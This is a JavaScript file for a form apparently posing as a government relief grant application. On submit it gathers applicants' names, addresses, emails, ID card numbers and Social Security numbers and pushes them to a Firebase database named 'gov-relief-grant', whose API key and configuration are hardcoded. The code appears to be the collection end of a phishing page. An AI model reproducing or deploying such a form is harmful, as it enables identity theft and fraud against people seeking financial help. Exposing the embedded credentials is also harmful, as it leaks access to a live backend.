// function message(){
//     var Name = document.getElementById('name');
//     var Address = document.getElementById('address');
//     var Email = document.getElementById('email');
//     var State = document.getElementById('state');
//     var City = document.getElementById('city');
//     var Zipcode = document.getElementById('zipcode');
//     var Marital = document.getElementById('marital');
//     var occupation = document.getElementById('occupation');
//     var idcard = document.getElementById('idcard');
//     var ssn = document.getElementById('ssn');

//     const success = document.getElementById('success');
//     const danger = document.getElementById('danger');

//     if(Name.value == '' || Address.value == '' || Email.value == '' || 
//     State.value == '' || Zipcode.value =='' || Marital.value == '' || 
//     occupation.value == '' || idcard.value == '' || ssn.value == ''){
//         danger.style.display = 'block';
//     } else {
//         setTimeout(()=>{
//             Name.value =  '';
//             Email.value = '';
//             Email.value = '';
//         }, 2000);
//         success.style.display = 'block'
//     }

//     setTimeout(()=> {
//         danger.style.display = "none";
//         success.style.display = "none";
//     }, 4000);
// }


const form = document.getElementById('contac_form');

const firebaseConfig = {
    apiKey: "AIzaSyBffcA_BGBuwJUnDLcvkT7RJqsN_1_vIvE",
    authDomain: "gov-relief-grant.firebaseapp.com",
    databaseURL: "https://gov-relief-grant-default-rtdb.firebaseio.com",
    projectId: "gov-relief-grant",
    storageBucket: "gov-relief-grant.appspot.com",
    messagingSenderId: "894923989788",
    appId: "1:894923989788:web:7b745f2a875ba195c510d9",
    measurementId: "G-3HTG3SHTP9"
  };

  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);

  const database = firebase.database()

  const ref = database.ref("message")

form.addEventListener("submit", (e)=>{
    e.preventDefault();


    const name = document.getElementById('name').value;
    const address = document.getElementById('address').value;
    const email = document.getElementById('email').value;
    const state = document.getElementById('state').value;
    const City = document.getElementById('city').value;
    const Zipcode = document.getElementById('zipcode').value;
    const Marital = document.getElementById('marital').value;
    const occupation = document.getElementById('occupation').value;
    const idcard = document.getElementById('idcard').value;
    const ssn = document.getElementById('ssn').value;

    console.log(name, address, email, state, ssn, idcard);

    ref.push({
        name:name,
        address:address,
        email:email,
        idcard:idcard,
        ssn:ssn
    })

    form.reset();
})